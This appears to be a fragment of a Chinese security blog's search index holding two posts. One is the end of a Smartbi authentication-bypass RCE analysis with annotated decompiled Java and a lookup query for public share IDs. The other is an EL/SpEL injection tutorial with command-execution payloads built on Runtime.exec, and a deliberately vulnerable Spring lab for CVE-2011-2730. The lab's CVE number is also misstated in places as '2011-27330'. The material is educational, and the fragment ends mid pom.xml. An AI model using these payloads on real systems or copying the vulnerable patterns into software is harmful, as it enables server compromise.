\u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/sparkUiMonitor/log\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/sparkUiMonitor/backMaster\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/dataprepare/sparkfunctions/import\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/dataprepare/sparkfunctions/delete/*\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/dataprepare/sparkfunctions/reset\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/dataprepare/sparkfunctions/update\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_MINING,MANAGE_ETL,AUGMENTED_DATASET_ETL\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/jobflow/config\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_JOBFLOW,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/jobflow/jobFlowLog/*\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_JOBFLOW,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/jobflow/jobFlowLog\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_JOBFLOW,MANAGE_TOOLKIT_SYSMONITOR\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/user/scheduleIsPasswordValidate\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_USERMANAGEMENT\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/user/isPasswordValidate\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_USERMANAGEMENT\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/admin/clearCache\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;AssertFunctionUrlPatchRule\u0026#34;, \u0026#34;funcList\u0026#34;: \u0026#34;MANAGE_TOOLKIT_EXPORTSYSTEMLOG\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/api/login\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;RejectPatchRule\u0026#34; }] }, { \u0026#34;url\u0026#34;: \u0026#34;/smartbix/*\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;RejectInvalidUrlPatchRule\u0026#34; }] } ] }, 找到漏洞路径/vision/share.jsp以及对应补丁代码\n4、漏洞源码分析 这里获取一个资源ID resid，如果这个资源ID符合isPublicShareResourceByShareType ，不管当前会话是否已登录，都将当前用户切换为public用户\n也就是说未登录的用户，访问资源时，会获得 public的权限。\n注： 如果没有添加库，就会如下图所示，找不到对应的方法、类\n如果要看到完整的代码，需要把 lib 库添加到项目结构中：\n具体要添加的库：\nE:\\Smartbi\\Tomcat\\lib\nE:\\Smartbi\\Tomcat\\webapps\\smartbi\\WEB-INF\\lib\n这样就可以看到完整的源码了\n接着上文，跟进 autoLoginByPublicUser\n该方法的作用： 如果系统允许匿名访问，则使用内部 SERVICE 账户临时授权，把当前用户切换为 public 用户。\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 //表示该方法不可通过远程 RMI 调用，只能内部调用 @NotRMI public boolean autoLoginByPublicUser() { //必须有一个 public 用户，否则登录失败 String userName = \u0026#34;public\u0026#34;; if (this.getUserByName(userName) == null) { return false; } else { //若本次会话没有，系统 ID，则设置为默认值 if (this.stateModule.getSystemId() == null) { this.stateModule.setSystemId(\u0026#34;DEFAULT_SYS\u0026#34;); } // SERVICE 是内部保留的系统用户 IUser serviceUser = this.getUserById(\u0026#34;SERVICE\u0026#34;); if (serviceUser == null) { throw (new SmartbiException(UserManagerErrorCode.NOT_EXIST_USER)).setDetail(\u0026#34;SERVICE\u0026#34;); } else { //如果当前用户已经是 public ，不再进行切换操作 IUser currentUser = this.safeGetCurrentUser(); if (currentUser != null \u0026amp;\u0026amp; \u0026#34;PUBLIC\u0026#34;.equals(currentUser.getId())) { return true; } else { //将当前用户强制设置为 SERVICE this.stateModule.setCurrentUser(serviceUser); this.stateModule.removeSessionAttribute(\u0026#34;SMARTBIX_STATE\u0026#34;); boolean ret = false; boolean var5; try { //switchUser 执行真正的用户切换 ret = this.switchUser(userName); var5 = ret; } finally { if (!ret) { this.stateModule.setCurrentUser(currentUser); } } return var5; } } } } 跟进 setCurrentUser，\njava\r1 2 3 4 5 6 7 8 9 @NotRMI public void setCurrentUser(IUser user) { //state 是 Smartbi 的一个独立 Session 状态对象，通常封装：登录用户、本地语言、当前 SystemId、用户权限缓存（role/resource）、登录 token、登录方式 this.getState().setUser(user); //在 HTTP Session 中记录用户名 this.setSessionAttribute(\u0026#34;user\u0026#34;, user == null ? null : user.getName()); //更新 Session 的语言环境 this.updateSessionLocale(user); } 跟进 switchUser\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 public boolean switchUser(String username) { //当前会话必须有用户，在上一步的 autoLoginByPublicUser() 把当前用户设置为 SERVICE boolean result = false; String loginFailReason = null; User currUser = (User)this.userManagerModule.getStateModule().getCurrentUser(); if (currUser == null) { return false; } else { //获取当前用户信息 String currUserName = currUser.getName(); UserBO userBO = new UserBO(currUser); try { //跳过登录的校验 String code = null; Collection\u0026lt;LoginCheckItem\u0026gt; skipChecks = new HashSet(Arrays.asList(LoginCheckItem.TWO_FACTOR_AUTH_CHECK)); //如果是 public ，还要跳过校验 LoginCheckItem.ROLE_ASSIGNMENT_CHECK if (\u0026#34;public\u0026#34;.equals(username)) { skipChecks.add(LoginCheckItem.ROLE_ASSIGNMENT_CHECK); } //verifyPassword 只有当前用户是 Admin 才允许 switchUser，普通用户不能随意切换 //而在 autoLoginByPublicUser 在切换 public 时，强制把当前用户变成 SERVICE（管理员），就可以通过 verifyPassword，进行切换 Supplier\u0026lt;Boolean\u0026gt; verifyPassword = () -\u0026gt; { if (userBO.isAdmin()) { return true; } else { throw new SmartbiException(UserManagerErrorCode.NO_PERMISSION); } }; //performLoginCheck 会执行用户是否存在、过期等等逻辑 result = this.performLoginCheck(username, (String)null, code, skipChecks, verifyPassword); } catch (SmartbiException e) { loginFailReason = e.getDetail() == null ? e.getMsg() : e.getDetail(); } finally { //写日志 JSONObject obj = new JSONObject(); Object attr = this.userManagerModule.getStateModule().getRequestAttribute(\u0026#34;loginByToken\u0026#34;); if (attr != null) { obj.put(\u0026#34;loginByToken\u0026#34;, attr.toString()); } obj.put(\u0026#34;switchUserBy\u0026#34;, currUserName); if (result) { this.performLoginSucceeded(username, (String)null, () -\u0026gt; obj); } else { this.performLoginFailed(username, loginFailReason, () -\u0026gt; obj); } } return result; } } 所以总结一下：我们需要找到一个资源 ID 符合 isPublicShareResourceByShareType，不管登录与否，都可以获得public用户的 session\n跟进 isPublicShareResourceByShareType\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public boolean isPublicShareResourceByShareType(String relateid, String shareType) { if (StringUtil.isNullOrEmpty(relateid)) { return false; } else { try { ShareRecord shareRecord = null; //根据 shareType 决定查询方式 if (StringUtil.isNotNullAndEmpty(shareType)) { shareRecord = SocialContactShareDAOFactory.getShareRecordDAO().loadWeChatByRelateid(relateid); } else { shareRecord = SocialContactShareDAOFactory.getShareRecordDAO().loadByRelateid(relateid); } //检查分享记录是否“公开分享且已启用” if (shareRecord != null \u0026amp;\u0026amp; shareRecord.getPublicshared() == 1 \u0026amp;\u0026amp; shareRecord.getEnabled()) { return true; } } catch (ParseException e) { LOG.error(e); } return false; } } 跟进 shareRecord\nshareRecord.getPublicshared()\nshareRecord.getEnabled()\n总结满足 isPublicShareResourceByShareType 的条件：\nrelateid不为空 shareType不为空 shareRecord.getPublicshared() == 1表示公开分享 shareRecord.getEnavled() == true deleted != 1分享不能被删除 cancelled != 1分享不能被取消 enddate == null为 null 就是永不过期 具体的构造需要找到对应的参数：\nc_deleted!=1 and c_cancelled!=1 and c_publicshared=1\n继续跟入loadByRelateid\n根据 relateid 字段查询一条 ShareRecord 记录\n去查找：\u0026ldquo;ShareRecord.getShareRecordByRelateid\u0026rdquo;\n表名 ：t_share_record\n列名 ： c_relateid\n构造查询语句：\nselect c_relateid from t_share_record where c_deleted != 1 and c_cancelled != 1 and c_publicshared = 1\n可能由于我没有安装演示库，导致什么都查不到\n看其他师傅的文章里是可以查询到结果的\n通过以上方法获取到有效 session 就可以在后台调用任意 js 代码达到远程代码执行的目的\n由于我没有获得有效的 session，后续就不复现了，，\n借用 @漫漫安全路 师傅的文章：\n参考： 【已复现】Smartbi 远程代码执行漏洞(QVD-2025-31926)安全风险通告\nSmartbi 最新认证绕过导致RCE漏洞分析\nsmartbi远程代码执行漏洞复现(QVD-2025-31926) - Zephyr07 - 博客园\n","permalink":"http://localhost:1313/xvsf/posts/smartbi-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0qvd-2025-31926/","summary":"\u003cp\u003e\u003cstrong\u003eSmartbi 远程代码执行漏洞复现(QVD-2025-31926)\u003c/strong\u003e\u003c/p\u003e\n\u003ch1 id=\"1-漏洞描述\"\u003e1、 漏洞描述\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e近日，奇安信CERT监测到官方修复Smartbi 远程代码执行漏洞(QVD-2025-31926)，该漏洞源于攻击者可通过默认资源ID绕过身份验证获取权限，配合后台接口实现远程代码执行，可能导致服务器被完全控制、数据泄露或业务系统沦陷。鉴于该漏洞影响范围较大，建议客户尽快做好自查及防护。\u003c/p\u003e","title":"Smartbi 远程代码执行漏洞复现(QVD-2025-31926)"},{"content":"EL 表达式注入 1、EL 概述 表达式语言(Expression Language) 简称 EL，是 Java EE（尤其是 JSP 技术）中用来在页面中简化访问 Java 对象、属性、集合和方法的一种语法。它的主要作用是取代 JSP 页面中复杂的 \u0026lt;%= ... %\u0026gt; 表达式，让 JSP 页面更简洁、可读性更高。\n1.1 EL 基本语法 要先通过 page 标签设置不忽略 EI 表达式\njava\r1 \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; isELIgnored=\u0026#34;false\u0026#34; %\u0026gt; 语法：\nEL 表达式使用 ${} 或 #{} 语法。\ntext\r1 ${expression} 在 JSP 中我们可以如下写：\n而 JSP 当中有四大域，它们分别是：\npage：当前页面有效 request：当前请求有效 session：当前会话有效 application：当前应用有效 el 表达式获取数据，会依次从这 4 个域中寻找，直到找到为止。而这四个域对象的作用范围如下图所示。\n例如： ${brands}，el 表达式获取数据，会先从 page 域对象中获取数据，如果没有再到 requet 域对象中获取数据，如果再没有再到 session 域对象中获取，如果还没有才会到 application 中获取数据。\n2、EL 表达式注入漏洞 2.1 通用 POC： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 //对应于JSP页面中的pageContext对象（注意：取的是pageContext对象） ${pageContext} //获取Web路径 ${pageContext.getSession().getServletContext().getClassLoader().getResource(\u0026#34;\u0026#34;)} //文件头参数 ${header} //获取webRoot ${applicationScope} //执行命令 ${pageContext.request.getSession().setAttribute(\u0026#34;a\u0026#34;,pageContext.request.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;).getMethod(\u0026#34;getRuntime\u0026#34;,null).invoke(null,null).exec(\u0026#34;calc\u0026#34;).getInputStream())} 2.2 简单漏洞利用 java\r1 ${pageContext.setAttribute(\u0026#34;a\u0026#34;,\u0026#34;\u0026#34;.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;).getMethod(\u0026#34;exec\u0026#34;,\u0026#34;\u0026#34;.getClass()).invoke(\u0026#34;\u0026#34;.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;).getMethod(\u0026#34;getRuntime\u0026#34;).invoke(null),\u0026#34;calc.exe\u0026#34;))} java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package com.src.eldemo; import java.io.*; import javax.servlet.ServletException; import javax.servlet.http.*; import javax.servlet.annotation.*; @WebServlet(name = \u0026#34;eldemo\u0026#34;, value = \u0026#34;/eldemo\u0026#34;) public class eldemo extends HttpServlet { private String message; @Override public void init() { message = \u0026#34;Hello EL!\u0026#34;; } @Override public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException { response.setContentType(\u0026#34;text/html\u0026#34;); //使用 RequestDispatcher 转发到 JSP 页面 try { request.getRequestDispatcher(\u0026#34;/eldemo.jsp\u0026#34;).forward(request, response); } catch (ServletException e) { throw new RuntimeException(e); } } @Override public void destroy() { } } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;%-- Created by IntelliJ IDEA. User: XVSHIFU Date: 2025/11/12 Time: 20:42 To change this template use File | Settings | File Templates. --%\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt; EL \u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt; EL 注入 测试\u0026lt;/h1\u0026gt; ${pageContext.setAttribute(\u0026#34;a\u0026#34;,\u0026#34;\u0026#34;.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;).getMethod(\u0026#34;exec\u0026#34;,\u0026#34;\u0026#34;.getClass()).invoke(\u0026#34;\u0026#34;.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;).getMethod(\u0026#34;getRuntime\u0026#34;).invoke(null),\u0026#34;calc.exe\u0026#34;))} \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 这种场景几乎不会遇到，也没有哪个开发者傻乎乎的让我们直接从外部控制 JSP 页面中的 EL 表达式。\n2.3 简单的漏洞场景（CVE-2011-2730） 2.3.1 漏洞复现 首先创建一个 spring 项目，构建漏洞场景：\n目录结构：\nVulnController.java\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package com.src.cve201127330; import org.springframework.stereotype.Controller; import org.springframework.ui.Model; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; @Controller public class VulnController { //漏洞入口： /search?q=恶意SpEL。将用户输入传入 Model，供 result.jsp 中 \u0026lt;spring:eval\u0026gt; 使用 @RequestMapping(\u0026#34;/search\u0026#34;) public String search(@RequestParam(value = \u0026#34;q\u0026#34;, defaultValue = \u0026#34;test\u0026#34;) String q, Model model) { model.addAttribute(\u0026#34;input\u0026#34;, q); // 对应 /WEB-INF/views/result.jsp return \u0026#34;result\u0026#34;; } } spring-servlet.xml\nxml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:context=\u0026#34;http://www.springframework.org/schema/context\u0026#34; xsi:schemaLocation=\u0026#34; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\u0026#34;\u0026gt; \u0026lt;!-- 扫描 Controller --\u0026gt; \u0026lt;context:component-scan base-package=\u0026#34;com.src.cve201127330\u0026#34; /\u0026gt; \u0026lt;!-- 视图解析器：映射逻辑名 → /WEB-INF/views/*.jsp --\u0026gt; \u0026lt;bean class=\u0026#34;org.springframework.web.servlet.view.InternalResourceViewResolver\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;prefix\u0026#34; value=\u0026#34;/WEB-INF/views/\u0026#34; /\u0026gt; \u0026lt;property name=\u0026#34;suffix\u0026#34; value=\u0026#34;.jsp\u0026#34; /\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; web.xml\nxml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://java.sun.com/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd\u0026#34; version=\u0026#34;2.5\u0026#34;\u0026gt; \u0026lt;display-name\u0026gt;CVE-2011-27330\u0026lt;/display-name\u0026gt; \u0026lt;!-- Spring MVC DispatcherServlet --\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;spring\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;org.springframework.web.servlet.DispatcherServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;spring\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;!-- 欢迎页 --\u0026gt; \u0026lt;welcome-file-list\u0026gt; \u0026lt;welcome-file\u0026gt;index.jsp\u0026lt;/welcome-file\u0026gt; \u0026lt;/welcome-file-list\u0026gt; \u0026lt;/web-app\u0026gt; index.jsp\nxml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;%-- Created by IntelliJ IDEA. User: XVSHIFU Date: 2025/11/13 Time: 21:26 To change this template use File | Settings | File Templates. --%\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;CVE-2011-27330 测试入口\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;CVE-2011-27330 复现环境\u0026lt;/h1\u0026gt; \u0026lt;form action=\u0026#34;search\u0026#34; method=\u0026#34;get\u0026#34;\u0026gt; 输入 SpEL 表达式：\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;q\u0026#34; size=\u0026#34;80\u0026#34; value=\u0026#34;T(java.lang.Runtime).getRuntime().exec(\u0026#39;calc\u0026#39;)\u0026#34; /\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;提交（危险！）\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;h3\u0026gt;示例载荷（Windows）\u0026lt;/h3\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;code\u0026gt;T(java.lang.Runtime).getRuntime().exec(\u0026#39;calc\u0026#39;)\u0026lt;/code\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;code\u0026gt;T(java.lang.Runtime).getRuntime().exec(\u0026#39;cmd /c notepad\u0026#39;)\u0026lt;/code\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; result.jsp\njsx\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;%-- Created by IntelliJ IDEA. User: XVSHIFU Date: 2025/11/13 Time: 21:26 To change this template use File | Settings | File Templates. --%\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;%@ taglib prefix=\u0026#34;spring\u0026#34; uri=\u0026#34;http://www.springframework.org/tags\u0026#34; %\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;CVE-2011-27330 Demo\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h2\u0026gt;[CVE-2011-27330] 搜索结果\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;你输入的内容：\u0026lt;strong\u0026gt;${input}\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;!-- ⚠️ 漏洞核心：将 ${input} 直接拼接到 SpEL 表达式中 --\u0026gt; \u0026lt;p\u0026gt;表达式求值结果：\u0026lt;br\u0026gt; \u0026lt;spring:eval expression=\u0026#34;\u0026#39;Hello, \u0026#39; + ${input}\u0026#34; /\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;h3\u0026gt;⚠️ 安全提示\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;本页面用于漏洞复现研究，实际开发中应避免此类写法！\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; pom.xml\nxml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;com.src\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;CVE-2011-27330\u0026lt;/artifactId\u0026gt; \u0026lt;!-- 保持你指定的名称 --\u0026gt; \u0026lt;version\u0026gt;1.0-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;packaging\u0026gt;war\u0026lt;/packaging\u0026gt; \u0026lt;name\u0026gt;CVE-2011-27330\u0026lt;/name\u0026gt; \u0026lt;description\u0026gt;Reproduction environment for internal reference CVE-2011-27330 (based on CVE-2011-2730)\u0026lt;/description\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;project.build.sourceEncoding\u0026gt;UTF-8\u0026lt;/project.build.sourceEncoding\u0026gt; \u0026lt;maven.compiler.source\u0026gt;1.6\u0026lt;/maven.compiler.source\u0026gt; \u0026lt;maven.compiler.target\u0026gt;1.6\u0026lt;/maven.compiler.target\u0026gt; \u0026lt;spring.version\u0026gt;3.0.5.RELEASE\u0026lt;/spring.version\u0026gt; \u0026lt;servlet.version\u0026gt;2.5\u0026lt;/servlet.version\u0026gt; \u0026lt;jsp.version\u0026gt;2.1\u0026lt;/jsp.version\u0026gt; \u0026lt;jstl.version\u0026gt;1.2\u0026lt;/jstl.version\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;!-- Core Spring MVC (vulnerable version) --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-webmvc\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${spring.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- Provided by Servlet Container --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javax.servlet\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;servlet-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${servlet.version}\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;provided\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javax.servlet.jsp\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jsp-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${jsp.version}\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;provided\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- JSTL for taglibs --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javax.servlet\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jstl\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${jstl.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- Logging --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-logging\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-logging\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.1.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;junit\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;junit\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.13.2\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.junit.jupiter\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;junit-jupiter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;RELEASE\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;build\u0026gt; \u0026lt;finalName\u0026gt;CVE-2011-27330\u0026lt;/finalName\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; 